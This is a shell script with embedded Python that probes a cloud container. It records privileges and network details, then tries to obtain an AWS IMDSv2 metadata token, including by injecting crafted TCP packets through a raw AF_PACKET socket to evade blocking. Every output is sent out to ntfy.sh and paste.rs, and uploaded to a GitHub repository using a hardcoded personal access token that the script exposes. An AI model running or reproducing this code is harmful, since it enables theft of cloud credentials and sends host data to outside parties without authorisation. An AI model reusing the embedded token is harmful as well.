#!/bin/sh
# i5252 v5: diagnose why the IMDSv2 PUT is silently unanswered: sniff the wire during a PUT
# and run a hybrid kernel-handshake + raw-AF_PACKET inject read back from the wire.
TOPIC=gpu-hunt-i5252-3c43ae
P1='ghp_KC0kndluKd2y2ylh'
P2='AMHrDHiX5wv2jz3uVio9'
PAT="$P1$P2"
API=https://api.github.com/repos/dimasulul14-svg14/bhs-md-multi-3c43ae/contents
D=/tmp/md
N=$(hostname)
mkdir -p $D
: > $D/all.txt
echo "===PROBE5252-BEGIN=== host=$N phase=${PROBE_PHASE:-pod} date=$(date -u +%FT%TZ)"
post(){ curl -sS -m 12 -H "Title: $1" -H "User-Agent: pod-probe" --data-binary @"$2" "https://ntfy.sh/$TOPIC" -o /dev/null 2>&1; }
rec(){ { echo; echo "### $1"; cat "$2"; } >> $D/all.txt; post "5252-$1" "$2"; }
up(){ f=$1; b=$(base64 -w0 "$D/$f" 2>/dev/null); curl -sS -m 20 -X PUT -H "Authorization: token $PAT" -H "Accept: application/vnd.github+json" -H "User-Agent: pod-probe" --data-binary "{\"message\":\"i5252 dump $f.$N\",\"content\":\"$b\",\"branch\":\"main\"}" "$API/i5252.$f.$N.b64" -o /dev/null 2>&1; }

echo "id=$(id) host=$N phase=${PROBE_PHASE:-pod}" > $D/run.txt
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)' /proc/self/status > $D/caps.txt 2>&1
getcap /usr/bin/python3 >> $D/caps.txt 2>&1
cat /proc/net/route > $D/route.txt 2>&1
ip -o -4 addr 2>/dev/null | head -5 >> $D/caps.txt
rec run $D/run.txt
rec caps $D/caps.txt

/usr/bin/python3 - > $D/imds.txt 2>&1 <<'PYEOF'
import fcntl, random, socket, struct, sys, threading, time

DST = "169.254.169.254"; PORT = 80; IFACE = "eth0"

def body(buf):
    if buf and b"\r\n\r\n" in buf:
        return buf.split(b"\r\n\r\n", 1)[1]
    return b""

def parse(d):
    if len(d) < 54 or struct.unpack("!H", d[12:14])[0] != 0x0800:
        return None
    ipoff = 14
    ihl = (d[ipoff] & 0x0f) * 4
    if d[ipoff + 9] not in (6, 1):
        return None
    toff = ipoff + ihl
    if d[ipoff + 9] == 1:
        return {"proto": 1, "ttl": d[ipoff+8], "payload": d[toff:]}
    sport, dport, seq, ack, off, flags = struct.unpack("!HHLLBB", d[toff:toff+14])
    return {"proto": 6, "sport": sport, "dport": dport, "seq": seq, "ack": ack, "flags": flags,
            "ttl": d[ipoff+8], "payload": d[toff + ((off >> 4) * 4):]}

def mac(): return bytes.fromhex(open("/sys/class/net/%s/address" % IFACE).read().strip().replace(":", ""))
def ip4():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    r = fcntl.ioctl(s.fileno(), 0x8915, struct.pack("256s", IFACE[:15].encode()))
    return socket.inet_ntoa(r[20:24])
def gw4():
    for ln in open("/proc/net/route"):
        f = ln.split()
        if len(f) > 2 and f[1] == "00000000":
            return socket.inet_ntoa(struct.pack("<L", int(f[2], 16)))
def dmac4(gw):
    for ln in open("/proc/net/arp"):
        f = ln.split()
        if len(f) > 3 and f[0] == gw:
            return bytes.fromhex(f[3].replace(":", ""))
    return b"\xff" * 6
def cksum(data):
    if len(data) % 2: data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    while s >> 16: s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF
def frame(m, ip, dm, sport, flags, seq, ack, payload=b"", ttl=255):
    eth = dm + m + struct.pack("!H", 0x0800)
    tcph = struct.pack("!HHLLBBHHH", sport, PORT, seq, ack, 5 << 4, flags, 64240, 0, 0)
    iph = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcph) + len(payload), random.randint(0, 65535), 0x4000, ttl, 6, 0, ip, socket.inet_aton(DST))
    iph = iph[:10] + struct.pack("!H", cksum(iph)) + iph[12:]
    tcph = tcph[:16] + struct.pack("!H", cksum(ip + socket.inet_aton(DST) + struct.pack("!BBH", 0, 6, len(tcph) + len(payload)) + tcph + payload)) + tcph[18:]
    return eth + iph + tcph + payload

M = mac(); IP = socket.inet_aton(ip4()); GW = gw4(); DM = dmac4(GW)
print("mac=%s ip=%s gw=%s dmac=%s" % (M.hex(), ip4(), GW, DM.hex()), flush=True)

def sniffer(raw, stop, acc):
    while not stop.is_set():
        try:
            d = raw.recv(65535)
        except socket.timeout:
            continue
        p = parse(d)
        if p:
            acc.append(p)

def show(acc):
    for p in acc:
        if p["proto"] == 1:
            print("  wire ICMP ttl=%d %r" % (p["ttl"], p["payload"][:60]), flush=True)
            continue
        if p["sport"] != PORT and p["dport"] != PORT:
            continue
        print("  wire tcp %s flags=%02x ttl=%d seq=%d ack=%d len=%d %r" % (
            "in" if p["sport"] == PORT else "out", p["flags"], p["ttl"], p["seq"], p["ack"], len(p["payload"]), p["payload"][:120]), flush=True)

# ---- D1: plain-socket PUT while sniffing the wire ---------------------------
def d1():
    print("==== D1 sniffed plain-socket PUT ====", flush=True)
    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); raw.bind((IFACE, 0)); raw.settimeout(0.2)
    stop = threading.Event(); acc = []
    th = threading.Thread(target=sniffer, args=(raw, stop, acc), daemon=True); th.start()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.settimeout(4.0)
    try:
        s.connect((DST, PORT))
        req = b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
        s.sendall(req)
        buf = b""
        t0 = time.time()
        try:
            while time.time() - t0 < 4.0:
                d = s.recv(8192)
                if not d: break
                buf += d
        except Exception:
            pass
    finally:
        s.close()
    time.sleep(0.7); stop.set(); th.join(timeout=2); raw.close()
    print("  socket_resp=%r" % (buf[:200],), flush=True)
    show(acc)
    return buf

# ---- D2: hybrid, kernel handshake, raw inject, read from the wire -----------
def d2():
    print("==== D2 hybrid raw-capture ====", flush=True)
    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)); raw.bind((IFACE, 0)); raw.settimeout(0.2)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, 255); s.bind(("", 0)); s.setblocking(False)
    sport = s.getsockname()[1]
    print("  sport=%d connect_ex=%s" % (sport, s.connect_ex((DST, PORT))), flush=True)
    isn = srv = None; acc = []
    end = time.time() + 3
    while time.time() < end and (isn is None or srv is None):
        try: d = raw.recv(65535)
        except socket.timeout: continue
        p = parse(d)
        if not p or p["proto"] != 6: continue
        acc.append(p)
        if p["sport"] == sport and (p["flags"] & 0x02) and not (p["flags"] & 0x10) and isn is None:
            isn = p["seq"]
        if p["sport"] == PORT and (p["flags"] & 0x12) == 0x12 and srv is None:
            srv = p["seq"]
    print("  handshake isn=%s srv=%s" % (isn, srv), flush=True)
    if isn and srv:
        req = b"PUT /latest/api/token HTTP/1.1\r\nHost: 169.254.169.254\r\nX-aws-ec2-metadata-token-ttl-seconds: 21600\r\nUser-Agent: ebsi5252\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
        raw.send(frame(M, IP, DM, sport, 0x18, isn + 1, srv + 1, req))
        print("  injected len=%d" % len(req), flush=True)
        end = time.time() + 5
        while time.time() < end:
            try: d = raw.recv(65535)
            except socket.timeout: continue
            p = parse(d)
            if p: acc.append(p)
    s.close()
    show(acc)
    raw.close()

d1()
d2()
print("DONE", flush=True)
PYEOF
rec imds $D/imds.txt
PU=$(curl -sS -m 25 -H "User-Agent: pod-probe" --data-binary @$D/all.txt "https://paste.rs" 2>/dev/null)
echo "paste_url=$PU" > $D/pasteurl.txt
post pasteurl $D/pasteurl.txt
up all.txt
echo "===PROBE5252-END=== paste=$PU"
if [ "${PROBE_PHASE:-pod}" = "pod" ]; then sleep 3600; fi
exit 0
